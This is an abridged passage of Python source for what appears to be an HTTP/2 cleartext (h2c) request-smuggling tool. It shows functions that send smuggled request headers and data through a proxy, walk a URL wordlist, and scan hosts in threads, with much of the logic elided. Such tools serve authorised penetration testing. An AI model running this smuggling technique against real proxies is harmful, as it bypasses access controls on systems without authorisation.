...
def sendData(h2_connection, connection, data, stream_id):
    ...
    if file_size == 0:
        ...
        print("[ERROR] Window closed. Incomplete data transmission.", file=sys.stderr)

    connection.sendall(h2_connection.data_to_send())


def sendSmuggledRequest(h2_connection, connection, smuggled_request_headers, args):
    stream_id = h2_connection.get_next_available_stream_id()

    h2_connection.send_headers(stream_id, smuggled_request_headers, end_stream=args.data is None)
    connection.sendall(h2_connection.data_to_send())

    if args.data:
        sendData(h2_connection, connection, args.data.encode("UTF-8"), stream_id)
...
def main(args):
    ...
    if args.wordlist:
        with open(args.wordlist) as fd:
            urls = [urlparse(urljoin(args.url, url.strip())) for url in fd.readlines()]
    else:
    ...
    for url in urls:
        ...
        sendSmuggledRequest(h2_connection, connection, smuggled_request_headers, args)
...
def scan(line):
    ...
    try:
        ...
        print("[ERROR] " + str(e) + ": " + line, file=sys.stderr)
        sys.stderr.flush()
    finally:
        if connection:
            connection.shutdown(socket.SHUT_RDWR)
...
def init():
    ...
    parser.add_argument("--threads", type=int, default=5, help="# of threads (for use with --scan-list)")
    parser.add_argument("--upgrade-only", default=False, action="store_true", help="drop HTTP2-Settings from Connection header")
    ...
    parser.add_argument("-m", "--max-time", type=float, default=10, help="socket timeout (default 10s)")
    ...
    if not args.proxy:
        print("Please provide a server for tunneling ('-x') flag", file=sys.stderr)
        sys.exit(1)
